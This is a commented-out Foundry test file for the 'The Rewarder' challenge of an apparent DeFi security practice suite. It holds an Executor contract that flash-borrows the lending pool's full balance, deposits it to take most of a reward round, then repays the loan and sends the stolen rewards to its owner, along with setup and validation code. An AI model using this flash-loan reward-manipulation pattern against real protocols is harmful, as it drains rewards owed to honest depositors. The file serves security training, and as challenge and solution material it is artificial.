// // SPDX-License-Identifier: MIT
// pragma solidity 0.8.14;

// import {Test} from "forge-std/Test.sol";
// import {Utilities} from "../Utilities.sol";
// import {console} from "forge-std/console.sol";
// import {Vm} from "forge-std/Vm.sol";
// import {Address} from "openzeppelin-contracts/utils/Address.sol";

// import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
// import {FlashLoanerPool}   from "../../src/the-rewarder/FlashLoanerPool.sol";
// import {TheRewarderPool}   from "../../src/the-rewarder/TheRewarderPool.sol";
// import {RewardToken}       from "../../src/the-rewarder/RewardToken.sol";
// import {AccountingToken}   from "../../src/the-rewarder/AccountingToken.sol";

// contract Executor {
//     DamnValuableToken liquidityToken;
//     FlashLoanerPool   flashLoanPool;
//     TheRewarderPool   rewarderPool;
//     RewardToken       rewardToken;
//     address owner;

//     constructor(
//         DamnValuableToken _liquidityToken, 
//         FlashLoanerPool   _flashLoanPool, 
//         TheRewarderPool   _rewarderPool, 
//         RewardToken       _rewardToken
//     ) {
//         owner = msg.sender;
//         liquidityToken  = _liquidityToken;
//         flashLoanPool   = _flashLoanPool;
//         rewarderPool    = _rewarderPool;
//         rewardToken     = _rewardToken;
//     }

//     function receiveFlashLoan(uint256 borrowAmount) external {
//         require(msg.sender == address(flashLoanPool), "only pool");
        
//         liquidityToken.approve(address(rewarderPool), borrowAmount);

//         // theorically depositing DVT call already distribute reward if the next round has already started
//         rewarderPool.deposit(borrowAmount);

//         // we can now withdraw everything
//         rewarderPool.withdraw(borrowAmount);

//         // we send back the borrowed tocken
//         bool payedBorrow = liquidityToken.transfer(address(flashLoanPool), borrowAmount);
//         require(payedBorrow, "Borrow not payed back");

//         // we transfer the rewarded RewardToken to the contract's owner
//         uint256 rewardBalance = rewardToken.balanceOf(address(this));
//         bool rewardSent = rewardToken.transfer(owner, rewardBalance);

//         require(rewardSent, "Reward not sent back to the contract's owner");
//     }

//     function attack() external {
//         require(msg.sender == owner, "only owner");

//         uint256 dvtPoolBalance = liquidityToken.balanceOf(address(flashLoanPool));
//         flashLoanPool.flashLoan(dvtPoolBalance);
//     }
// }

// contract TheRewarder is Test {
//     //Vm internal immutable vm = Vm(HEVM_ADDRESS);

//     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
//     uint256 internal constant USER_DEPOSIT = 100e18;

//     Utilities internal utils;
//     FlashLoanerPool internal flashLoanerPool;
//     TheRewarderPool internal theRewarderPool;
//     DamnValuableToken internal liquidityToken;

//     address payable[] internal users;
//     address payable internal attacker;
//     address payable internal alice;
//     address payable internal bob;
//     address payable internal charlie;
//     address payable internal david;

//     function setUp() public {
//         utils = new Utilities();
//         users = utils.createUsers(5);

//         alice = users[0];
//         bob = users[1];
//         charlie = users[2];
//         david = users[3];
//         attacker = users[4];

//         vm.label(alice, "Alice");
//         vm.label(bob, "Bob");
//         vm.label(charlie, "Charlie");
//         vm.label(david, "David");
//         vm.label(attacker, "Attacker");

//         liquidityToken = new DamnValuableToken();
//         vm.label(address(liquidityToken), "liquidityToken");

//         flashLoanerPool = new FlashLoanerPool(address(liquidityToken));
//         vm.label(address(flashLoanerPool), "Flash Loaner Pool");

//         // Set initial token balance of the pool offering flash loans
//         liquidityToken.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

//         theRewarderPool = new TheRewarderPool(address(liquidityToken));

//         // Alice, Bob, Charlie and David deposit 100 tokens each
//         for (uint8 i; i < 4; i++) {
//             liquidityToken.transfer(users[i], USER_DEPOSIT);
//             vm.startPrank(users[i]);
//             liquidityToken.approve(address(theRewarderPool), USER_DEPOSIT);
//             theRewarderPool.deposit(USER_DEPOSIT);
//             assertEq(
//                 theRewarderPool.accToken().balanceOf(users[i]),
//                 USER_DEPOSIT
//             );
//             vm.stopPrank();
//         }

//         assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
//         assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

//         // Advance time 5 days so that depositors can get rewards
//         vm.warp(block.timestamp + 5 days); // 5 days

//         for (uint8 i; i < 4; i++) {
//             vm.prank(users[i]);
//             theRewarderPool.distributeRewards();
//             assertEq(
//                 theRewarderPool.rewardToken().balanceOf(users[i]),
//                 25e18 // Each depositor gets 25 reward tokens
//             );
//         }

//         assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
//         assertEq(liquidityToken.balanceOf(attacker), 0); // Attacker starts with zero liquidityToken tokens in balance
//         assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far

//         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
//     }

//     function testExploit() public {
//         /** EXPLOIT START **/

//         /** EXPLOIT END **/
//         validation();
//     }

//     function validation() internal {
//         assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
//         for (uint8 i; i < 4; i++) {
//             // Users should get negligible rewards this round
//             vm.prank(users[i]);
//             theRewarderPool.distributeRewards();
//             uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(
//                 users[i]
//             );
//             uint256 delta = rewardPerUser - 25e18;
//             assertLt(delta, 1e16);
//         }
//         // Rewards must have been issued to the attacker account
//         assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
//         uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(
//             attacker
//         );

//         // The amount of rewards earned should be really close to 100 tokens
//         uint256 deltaAttacker = 100e18 - rewardAttacker;
//         assertLt(deltaAttacker, 1e17);

//         // Attacker finishes with zero liquidityToken tokens in balance
//         assertEq(liquidityToken.balanceOf(attacker), 0);
//     }
// }